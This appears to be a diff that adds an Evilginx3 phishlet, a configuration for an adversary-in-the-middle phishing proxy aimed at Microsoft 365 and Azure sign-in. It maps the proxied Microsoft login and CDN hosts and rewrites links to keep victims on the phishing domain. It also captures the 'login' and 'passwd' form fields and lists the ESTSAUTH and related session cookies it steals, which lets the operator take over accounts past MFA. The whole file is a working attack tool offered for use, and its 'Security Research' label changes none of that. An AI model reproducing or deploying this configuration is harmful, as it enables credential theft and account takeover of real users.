@@ -1,0 +1,52 @@
+# Azure Portal / Microsoft 365 Phishlet for Evilginx3
+# Author: Security Research
+# Tested against Microsoft login flow (login.microsoftonline.com)
+
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'azure.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+auth_tokens:
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'CCState', 'buid', 'esctx', 'x-ms-gateway-slice', 'stsservicecookie']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+force_post:
+  - path: '/common/login'
+    search:
+      - {key: 'login', search: '.*'}
+      - {key: 'passwd', search: '.*'}
+    force:
+      - {key: 'login', value: '{login}'}
+      - {key: 'passwd', value: '{passwd}'}
+    type: 'post'
